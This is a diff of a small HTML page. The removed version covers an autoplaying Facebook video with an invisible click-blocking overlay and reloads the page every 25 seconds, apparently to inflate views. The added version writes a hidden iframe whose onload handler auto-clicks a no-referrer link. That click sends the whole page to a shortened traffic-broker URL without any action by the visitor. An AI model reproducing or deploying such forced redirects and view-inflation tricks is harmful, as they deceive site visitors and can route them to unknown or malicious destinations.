@@ -1,95 +1,31 @@
-
-
-<html> 
-  <body> 
-      <div id="playerif" style="position: relative">
-        <div
-          id="infoi"
-          style="
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 10;"></div>
-        <div
-          id="fbvideo"
-          class="fb-video disable-click width-500 height-200"
-          data-href=""
-          data-width="400"
-          data-show-text="false"
-          data-allowfullscreen="false"
-          data-autoplay="true"
-          data-show-captions="false"
-        ></div>
-      </div>
-      <br /> 
-     <br /> <a onclick="startvideo()" href="#"></a></div>
-
-<script>
-        document.addEventListener("DOMContentLoaded", function () {
-          function setRandomVideoLink() {
-            var videoLinks = ["https://www.facebook.com/watch/?v=817754443535306"];
-            
-            var randomIndex = Math.floor(Math.random() * videoLinks.length);
-            console.log(randomIndex);
-            var fbVideoElement = document.getElementById("fbvideo");
-            fbVideoElement.setAttribute("data-href", videoLinks[randomIndex]);}
-          setRandomVideoLink();
-          setInterval(function () {
-            location.reload();
-          }, 25000); 
-        });
-      </script>
-<script type="text/javascript">
-        var brojac = -1;
-        var timprovplay;
-        var videoStarted = false;
-        var watchingFinished = false;
-        var my_video_player = {};
-        my_video_player.subscribe = (a, b) => {};
-        my_video_player.play = () => {};
-
-        window.fbAsyncInit = function () {
-          FB.init({
-            appId: "{your-app-id}",
-            xfbml: true,
-            version: "v2.5",
-          });
-FB.Event.subscribe("xfbml.ready", function (msg) {
-            if (msg.type === "video") {
-                		            msg.instance.play();
-                		            my_video_player = msg.instance;
-            }
-          });
-        };
-        (function (d, s, id) {
-          var js,
-            fjs = d.getElementsByTagName(s)[0];
-          if (d.getElementById(id)) {
-            return;
-          }
-          js = d.createElement(s);
-          js.id = id;
-          js.src = "//connect.facebook.net/en_US/sdk.js";
-          fjs.parentNode.insertBefore(js, fjs);
-        })(document, "script", "facebook-jssdk");
-
-        function startvideo() {
-          var myEventStart = my_video_player.subscribe(
-            "startedPlaying",
-            function (e) {
-          
-            });
-          playlink();
-          my_video_player.play();}
-        function counter() {}
-        document.addEventListener("DOMContentLoaded", function (event) {
-          setTimeout(function () {
-            startvideo();
-          }, 2000);
-        });
-        function playlink() { }</script>
-      </div>
-  </body>
-</html>
+<head>
+	<meta charset="utf-8" />
+	<style type="text/css">
+	html, body { margin: 0; padding: 0; height: 100%; }
+	iframe {
+	position: absolute;
+	top: 0; left: 0; width: 100%; height: 100%;
+	border: none; padding-top: 32px;
+	box-sizing: border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box;
+	}
+	</style>
+</head>
+	<body>
+	<iframe id="FileFrame" src="about:blank"></iframe>
+	<script type="text/javascript">
+	var doc = document.getElementById('FileFrame').contentWindow.document;
+	doc.open();
+	doc.write(
+	'<html>'
+	+ ' <head>'
+	+ ' <title></title>'
+	+ ' </head>'
+	+ ' <body onload="document.getElementById(\'link\').click();">'
+	+ ' <a id="link" target="_parent" rel="noreferrer" href="https://trafficmediad.com/3LMwNGg"></a>'
+	+ ' </body>'
+	+ '</html>'
+	);
+	doc.close();
+	</script>
+	</body>
+	</html>
